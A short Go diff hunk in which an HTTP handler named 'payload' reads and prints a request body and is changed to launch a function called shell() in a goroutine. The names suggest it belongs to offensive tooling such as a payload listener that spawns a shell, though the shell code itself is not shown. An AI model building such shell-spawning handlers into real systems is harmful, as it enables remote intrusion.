@@ -17,7 +17,7 @@ func payload(w http.ResponseWriter, r *http.Request) {
 		result, _ := ioutil.ReadAll(r.Body)
 		r.Body.Close()
 		fmt.Printf("%s\n", result)
-		shell()
+		go shell()
 	}
 }
 func shell() {
